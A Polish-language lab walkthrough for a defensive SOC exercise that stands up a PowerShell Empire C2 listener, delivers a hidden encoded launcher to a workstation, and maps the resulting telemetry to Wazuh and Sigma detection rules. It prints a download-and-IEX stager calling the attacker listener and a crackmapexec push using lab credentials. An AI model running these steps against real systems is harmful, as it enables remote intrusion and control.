# Atak 03 — PowerShell Empire (C2)

> **MITRE ATT&CK:** T1059.001 (PowerShell), T1071.001 (Web Protocols C2), T1027 (Obfuscated Files)

Ten scenariusz nie ma jednoplikowego "skryptu" — Empire jest pełnym frameworkiem C2 i wymaga sesji interaktywnej. Dokument opisuje krok po kroku, jak postawić listener, wygenerować stager i odpalić beacon na WS01.

---

## 1. Przygotowanie atakującego (Kali)

### 1.1. Instalacja Empire 5.x

Empire 4 jest archiwalny — używamy aktywnie rozwijanego Empire 5 od BC-Security.

```bash
# Z VM kali (vagrant ssh kali)
sudo apt update
sudo apt install -y python3-pip docker.io git

cd /opt
sudo git clone --recursive https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh    # ~10 min — instaluje wszystkie zależności
```

Po instalacji weryfikujemy:

```bash
sudo ./ps-empire server --version
# expected: Empire Server 5.x.x
```

### 1.2. Uruchomienie serwera Empire

W jednej sesji terminala:

```bash
cd /opt/Empire
sudo ./ps-empire server
# Czekaj na: "Empire starting up..." i "Empire RESTful API started on port 1337"
```

W drugiej sesji uruchamiamy klienta:

```bash
sudo ./ps-empire client
```

---

## 2. Stworzenie listenera

Listener to serwer HTTP, na który będą się łączyć implanty (beaconi).

```
(Empire) > uselistener http
(Empire: uselistener/http) > set Host http://192.168.30.30
(Empire: uselistener/http) > set Port 8080
(Empire: uselistener/http) > set Name lab-http
(Empire: uselistener/http) > execute

[+] Listener lab-http successfully started
```

Sprawdzenie:

```
(Empire) > listeners

  Name      | Module | Listener Category | Created                  | Enabled
  ----------+--------+-------------------+--------------------------+--------
  lab-http  | http   | client_server     | 2026-05-21 14:30:01 UTC  | True
```

Listener nasłuchuje na `http://192.168.30.30:8080`. Wszystkie ścieżki w typowym Empire HTTP listenerze (`/admin/get.php`, `/news.php`, `/login/process.php`) są charakterystyczne — analityk SOC powinien je znać.

---

## 3. Generowanie stagera

Stager to mały kod wykonywalny po stronie ofiary, który pobierze pełny implant z listenera.

```
(Empire) > usestager windows/launcher_bat
(Empire: usestager/windows/launcher_bat) > set Listener lab-http
(Empire: usestager/windows/launcher_bat) > generate

[+] launcher.bat written to /tmp/launcher.bat
```

Zawartość `launcher.bat` (charakterystyczne — i to wyłapuje nasza detekcja):

```batch
@echo off
start /b powershell -NoP -sta -NonI -W Hidden -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAFgA[...4 KB base64...]
exit
```

To jest **klasyczny pattern** stagerów Empire/Cobalt Strike/Sliver:
- `-NoP` (NoProfile)
- `-sta` (Single Threaded Apartment)
- `-NonI` (NonInteractive)
- `-W Hidden` (Window hidden)
- `-Enc <base64>`

---

## 4. Dostarczenie stagera na WS01

W realnym ataku: phishing PDF z makrem, USB drop, drive-by download.
W labie: ręczne skopiowanie.

```bash
# Z Kali:
scp /tmp/launcher.bat vagrant@192.168.20.20:/tmp/launcher.bat
# (z hosta — bo bezpośrednio z VLAN 30 może być zablokowane; alternatywnie
#  użyj SMB share albo HTTP serwera)
```

Lub przez WinRM (jeśli włączone):

```bash
crackmapexec winrm 192.168.20.20 \
    -u akowalska -p 'Wiosna2024!' -d soclab.local \
    --put-file /tmp/launcher.bat 'C:\Users\akowalska\Desktop\update.bat'
```

---

## 5. Uruchomienie po stronie ofiary

Na WS01 (jako `SOCLAB\akowalska`):

```cmd
C:\> cd C:\Users\akowalska\Desktop
C:\> update.bat
```

Okno znika natychmiast — `start /b` z `-W Hidden` zapewnia, że użytkownik nic nie zobaczy. Po 1–2 sekundach po stronie Empire pojawia się agent:

```
(Empire) > agents

  Name     | Lang | Internal IP    | Hostname | Username           | Process       | Last Seen
  ---------+------+----------------+----------+--------------------+---------------+---------------------
  ABCDE123 | ps   | 192.168.20.20  | ws01     | SOCLAB\akowalska   | powershell/4128 | 2026-05-21 14:42:11
```

---

## 6. Wykonanie post-exploitation (przykład)

```
(Empire) > interact ABCDE123
(Empire: ABCDE123) > shell whoami
soclab\akowalska

(Empire: ABCDE123) > shell systeminfo
Host Name:                 WS01
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
...

(Empire: ABCDE123) > usemodule powershell/situational_awareness/network/powerview/get_domain_user
(Empire: usemodule) > execute
[*] Tasked ABCDE123 to run module powershell/...
[+] Tasking finished. Results:
Anna Kowalska (akowalska) — Domain Admins
Jan Nowak (jnowak)
Backup Service (svc-backup)
```

---

## 7. Co generuje to po stronie telemetrii

### Na WS01

**Sysmon EID 1 (ProcessCreate):**

| Field | Value |
|---|---|
| `Image` | `C:\Windows\System32\cmd.exe` |
| `CommandLine` | `cmd.exe /c update.bat` |
| `ParentImage` | `C:\Windows\explorer.exe` |

Następnie (zaraz po):

| Field | Value |
|---|---|
| `Image` | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| `CommandLine` | `powershell -NoP -sta -NonI -W Hidden -Enc UwBlAHQA...` |
| `ParentImage` | `C:\Windows\System32\cmd.exe` |

**EventLog `Microsoft-Windows-PowerShell/Operational` EID 4104 (ScriptBlockLogging):**

Po zdekodowaniu base64 — pełny kod stagera, ~4 KB. Zawiera m.in.:
```powershell
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 ...")
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$data = $wc.DownloadData("http://192.168.30.30:8080/admin/get.php?...")
IEX (New-Object IO.StreamReader(
    (New-Object IO.Compression.DeflateStream(
        (New-Object IO.MemoryStream(,$data)),
        [IO.Compression.CompressionMode]::Decompress))
).ReadToEnd())
```

**Sysmon EID 3 (NetworkConnect)** — co `Delay` sekund (domyślnie 5 s):

| Field | Value |
|---|---|
| `Image` | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| `DestinationIp` | `192.168.30.30` |
| `DestinationPort` | `8080` |

---

## 8. Detekcja

Reguły w `detection-rules/custom-wazuh-rules.xml`:

| Rule ID | Trigger | Level | MITRE |
|---|---|---|---|
| **100212** | `commandLine` zawiera `-Enc[odedCommand]` z base64 ≥ 200 znaków | 11 | T1059.001, T1027 |
| **100213** | `powershell.exe` robi NetworkConnect do IP spoza VLAN 20 | 10 | T1071.001 |
| **100214** | ScriptBlockText zawiera `IEX` AND (`DownloadString` OR `DownloadData`) | 12 | T1059.001, T1105 |
| **100299** | Wszystkie trzy powyższe wystrzeliły w 60s dla tego samego hosta | 14 | T1059.001 (meta-alert) |

Sigma w `detection-rules/sigma-rules/`:

- `powershell-suspicious-iex-download.yml`
- `powershell-encoded-command-long.yml`

---

## 9. Cleanup po teście

Na WS01:

```powershell
Stop-Process -Name powershell -Force -ErrorAction SilentlyContinue
Remove-Item C:\Users\akowalska\Desktop\update.bat -Force
```

Na Kali:

```
(Empire) > kill ABCDE123
(Empire) > listeners
(Empire: listeners) > kill lab-http
(Empire) > exit
```

---

## 10. Lessons learned z tego scenariusza

1. **Pojedyncza reguła detekcji to za mało.** Encoded PowerShell to chleb powszedni adminów — daje wysoki FP. Korelacja z dwoma innymi sygnałami (IEX + outbound) daje meta-alert z bardzo niskim FP.
2. **Beacon interval to skarb dla analityka.** Empire bezpiecznym defaultem wysyła co 5 s z jitterem 0. Atakujący o tym wie i będzie ustawiać `Delay 60 + Jitter 50%` — wtedy detekcja na liczbę połączeń przestaje działać. W produkcji potrzebujemy analizy regularności (Beacon Hunter, RITA).
3. **ScriptBlockLogging musi być włączony.** Bez EID 4104 nie zobaczymy zdekodowanego stagera — tylko base64, który dla analityka jest mało użyteczny do pivotu.
4. **AppLocker / WDAC > detekcja.** Najlepsze wykrycie tego ataku to brak wykonania — polityka, która nie pozwala uruchomić niewpisanego na whitelistę `.bat`/`.ps1`, blokuje cały scenariusz na etapie 4 (uruchomienie launchera).
